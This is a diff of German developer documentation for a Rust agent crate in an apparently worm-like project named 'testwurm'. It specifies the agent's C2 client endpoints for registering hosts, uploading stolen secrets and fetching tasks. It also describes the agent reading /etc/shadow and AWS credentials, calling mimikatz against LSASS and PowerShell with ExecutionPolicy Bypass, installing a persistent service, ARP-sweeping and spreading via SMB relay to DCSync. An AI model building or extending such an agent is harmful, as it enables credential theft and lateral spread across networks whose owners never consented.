@@ -19,7 +19,8 @@ nicht mehr [hostkey.rs:KeySealer] [hostkey.rs:versiegel].
 selbst registrieren, lokale Secrets extrahieren und hochladen, Persistenz
 installieren, Hosts entdecken (ARP-Sweep oder vorgegebene `--hosts`-Liste), die
 Propagation ausführen und deren Ergebnisse an den C2-Server melden. `c2.rs`
-kapselt die HTTP-Kommunikation (ureq + rustls via `kx_tls`), `propagate.rs` die
+kapselt die HTTP-Kommunikation als dünnen Adapter über den Transport aus
+`kx_core::c2::transport` (dort: ureq + rustls via `kx_tls`), `propagate.rs` die
 Scan-und-Exploit-Logik (`kx_scanner`, `kx_exploit`).
 
 Der Wire-Vertrag liegt nicht in diesem Crate, sondern in `kx_core::c2` — Agent
@@ -59,25 +60,26 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 
 ### c2.rs — C2-Client
 
-- `[c2.rs:C2Error]` — `pub enum C2Error` (`thiserror::Error`) mit `Http(String)`,
-  `Tls(String)`, `Json(String)`.
-- `[c2.rs:C2Client]` — `pub struct C2Client` mit privaten Feldern
-  `agent: ureq::Agent`, `base_url: String`, `token: String`.
-- `[c2.rs:C2Client::new]` — `pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, C2Error>`.
-- `[c2.rs:C2Client::register_host]` — `pub async fn register_host(&self, req: &RegisterRequest) -> Result<(), C2Error>`;
+Der Client ist ein dünner Adapter über den Transport aus
+`kx_core::c2::transport` — TLS-Aufbau, Bearer-Header, URL-Bildung und
+Status→Fehler stehen dort, nicht in diesem Crate.
+
+- `[c2.rs:C2Client]` — `pub struct C2Client` mit privatem Feld
+  `transport: Transport`.
+- `[c2.rs:C2Client::new]` — `pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, TransportError>`;
+  liest das Server-Zertifikat über `Transport::from_cert_file`.
+- `[c2.rs:C2Client::register_host]` — `pub async fn register_host(&self, req: &RegisterRequest) -> Result<(), TransportError>`;
   POST `{base_url}/api/register`.
-- `[c2.rs:C2Client::upload_secret]` — `pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), C2Error>`;
+- `[c2.rs:C2Client::upload_secret]` — `pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), TransportError>`;
   POST `{base_url}/api/secrets`.
-- `[c2.rs:C2Client::fetch_tasks]` — `pub async fn fetch_tasks(&self) -> Result<Vec<Task>, C2Error>`;
+- `[c2.rs:C2Client::fetch_tasks]` — `pub async fn fetch_tasks(&self) -> Result<Vec<Task>, TransportError>`;
   GET `{base_url}/api/tasks`.
-- `[c2.rs:C2Client::report_task_result]` — `pub async fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), C2Error>`;
+- `[c2.rs:C2Client::report_task_result]` — `pub async fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), TransportError>`;
   POST `{base_url}/api/tasks/result`.
-- `[c2.rs:ensure_ok]` — `async fn ensure_ok(resp: ureq::Response) -> Result<(), C2Error>` (privat);
-  akzeptiert nur HTTP 200 und 201.
 
 ### tasks.rs — Task-Ausführung
 
-- `[tasks.rs:run_pending_tasks]` — `pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, C2Error>`;
+- `[tasks.rs:run_pending_tasks]` — `pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, TransportError>`;
   holt die offenen Tasks, führt diejenigen mit eigener Host-Kennung und Status
   `pending` aus und meldet Status und Ausgabe zurück.
 - `[tasks.rs:execute_command]` — `fn execute_command(command: &str) -> CommandOutput` (privat);
@@ -151,10 +153,10 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 - Der Servicename ist auf beiden Plattformen `"kx-agent"`; der Windows-Anzeigename ist `"Kx Agent"`, unix übergibt eine leere Beschreibung [main.rs:install_persistence].
 - Eine leere `discovered`-Liste beendet die Propagation sofort ohne Scan (`debug!`-Log, leere Ergebnisse). Der TCP-Scan läuft immer mit `kx_scanner::COMMON_PORTS` und Timeout `1000` [propagate.rs:run_propagation].
 - Das Port-zu-Dienst-Mapping ist fest; jeder nicht gelistete Port ergibt `"unknown"` [propagate.rs:service_for_port].
-- `base_url` ist `server.trim_end_matches('/')`; nachgestellte Slashes werden entfernt, bevor Pfade angehängt werden [c2.rs:C2Client::new].
-- Das Server-Zertifikat wird per `std::fs::read(server_cert)` geladen; ein Lesefehler wird zu `C2Error::Tls("Zertifikat nicht lesbar: {e}")`, ein Fehler in `kx_tls::client_config_trusting` zu `C2Error::Tls`. Eine Verifikation gegen den System-Store findet nicht statt, da der Server selbstsignierte Zertifikate verwendet [c2.rs:C2Client::new].
-- Nur Status 200 und 201 gelten als Erfolg; jeder andere Status erzeugt `C2Error::Http(format!("Status {status}: {body}"))` mit Response-Body, Fallback `"<binär>"` bei nicht lesbarem Body [c2.rs:ensure_ok].
-- Der Request trägt immer den Header `Authorization: Bearer {token}`; der Body ist die `serde_json`-Serialisierung des übergebenen `RegisterRequest` bzw. `SecretUpload` [c2.rs:C2Client::register_host] [c2.rs:C2Client::upload_secret].
+- `base_url` ist `server.trim_end_matches('/')`; nachgestellte Slashes werden entfernt, bevor Pfade angehängt werden [kx-core/src/c2/transport.rs:Transport::new](../../kx-core/src/c2/transport.rs).
+- Das Server-Zertifikat wird per `std::fs::read(server_cert)` geladen; ein Lesefehler wird zu `TransportError::Tls("Zertifikat nicht lesbar: {e}")`, ein Fehler in `kx_tls::client_config_trusting` zu `TransportError::Tls`. Eine Verifikation gegen den System-Store findet nicht statt, da der Server selbstsignierte Zertifikate verwendet [kx-core/src/c2/transport.rs:Transport::from_cert_file](../../kx-core/src/c2/transport.rs).
+- Nur Status 200 und 201 gelten als Erfolg; jeder andere Status erzeugt `TransportError::Http(format!("Status {status}: {body}"))` mit Response-Body, Fallback `"<binär>"` bei nicht lesbarem Body [kx-core/src/c2/transport.rs:ensure_ok](../../kx-core/src/c2/transport.rs).
+- Der Request trägt immer den Header `Authorization: Bearer {token}`; der Body ist die `serde_json`-Serialisierung des übergebenen `RegisterRequest` bzw. `SecretUpload` [kx-core/src/c2/transport.rs:post_json_request](../../kx-core/src/c2/transport.rs).
 - `Args` leitet `Debug` ab, das Token-Feld ist aber mit dem eigenen Typ `Secret` gekapselt: dessen `Debug`-Ausgabe maskiert den Wert (`***`), der Klartext ist nur über `Secret::as_str` erreichbar. Eine Debug-Ausgabe der Argumentstruktur enthält das Token damit nicht [main.rs:Secret] [main.rs:Args].
 
 ## Side Effects
@@ -173,7 +175,7 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 - `[main.rs:install_persistence]` — Spawnt unter Windows `cmd.exe /C sc.exe create kx-agent binPath= "<exe>" start= auto DisplayName= "Kx Agent"` und danach `sc.exe start kx-agent` [kx-win/src/persist.rs:install_service](../../kx-win/src/persist.rs) [kx-win/src/persist.rs:start_service](../../kx-win/src/persist.rs).
 - `[main.rs:collect_local_secrets]` — Liest unter unix `/etc/shadow` [kx-posix/src/secrets.rs:extract_shadow_hashes](../../kx-posix/src/secrets.rs) und `$HOME/.aws/credentials` (mit `HOME` als Env-Variable, Fallback `/root`) [kx-posix/src/secrets.rs:extract_aws_credentials](../../kx-posix/src/secrets.rs).
 - `[main.rs:collect_local_secrets]` — Spawnt unter Windows `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ...` für den Credential Manager [kx-win/src/secrets.rs:extract_credential_manager](../../kx-win/src/secrets.rs) und `mimikatz.exe sekurlsa::logonpasswords` für LSASS [kx-win/src/secrets.rs:extract_lsass](../../kx-win/src/secrets.rs).
-- `[c2.rs:C2Client::new]` — Liest das Server-Zertifikat (PEM) per `std::fs::read` von der Platte; der `ureq::Agent` vertraut genau diesem PEM über `kx_tls::client_config_trusting`.
+- `[c2.rs:C2Client::new]` — Liest das Server-Zertifikat (PEM) per `std::fs::read` von der Platte; der `ureq::Agent` des Transportes vertraut genau diesem PEM über `kx_tls::client_config_trusting` [kx-core/src/c2/transport.rs:Transport::from_cert_file](../../kx-core/src/c2/transport.rs).
 - `[c2.rs:C2Client::register_host]` — Sendet einen HTTP-POST an `{base_url}/api/register` mit JSON-Body = serialisierter `RegisterRequest` und Header `Authorization: Bearer {token}`.
 - `[c2.rs:C2Client::upload_secret]` — Sendet einen HTTP-POST an `{base_url}/api/secrets` mit JSON-Body = serialisierter `SecretUpload` und Header `Authorization: Bearer {token}`.
 - `[propagate.rs:run_propagation]` — Versucht SMB-Relay nach DCSync gegen Hosts mit Port 445 über `kx_exploit::smb_relay_dcsync(&relay_cfg)` unter Verwendung des Pfads `relay_script`; fehlt das Skript oder Impacket, endet der Versuch kontrolliert mit einem Fehler.
@@ -182,6 +184,6 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 ## Verification
 
 - Run: `cargo test` (ausgeführt in `/Volumes/T7/Projekte/testwurm/kx`)
-- Stand: `cargo test --workspace` läuft grün — **59 Tests, 0 Fehler**; davon `cargo test -p kx-agent`: **3 Tests, 0 Fehler**, alle in `c2.rs` (`client_uses_the_contract_paths`, `register_request_serializes_host_id`, `secret_upload_carries_its_host_id`).
+- Stand: `cargo test --workspace` läuft grün — **130 Tests, 0 Fehler**; davon `cargo test -p kx-agent`: **16 Tests, 0 Fehler**, davon 3 in `c2.rs` (`client_uses_the_contract_paths`, `register_request_serializes_host_id`, `secret_upload_carries_its_host_id`).
 - Die Tests prüfen die Vertragsbindung: `PATH_REGISTER == "/api/register"`, `PATH_SECRETS == "/api/secrets"`, die Serialisierung von `RegisterRequest` (`v["ip"]`, `v["host_id"]`) und von `SecretUpload` (`v["host_id"]`, `v["source"]`) [c2.rs:tests::client_uses_the_contract_paths] [c2.rs:tests::register_request_serializes_host_id] [c2.rs:tests::secret_upload_carries_its_host_id].
 - Die AF_PACKET-spezifischen Teile von `kx-scanner/src/arp.rs` sind mit `#[cfg(target_os = "linux")]` ausgezeichnet; `arp_sweep` existiert in beiden Varianten und liefert außerhalb Linux `ScanError::Unsupported` statt zu kompilieren [kx-scanner/src/arp.rs:arp_sweep](../../kx-scanner/src/arp.rs).
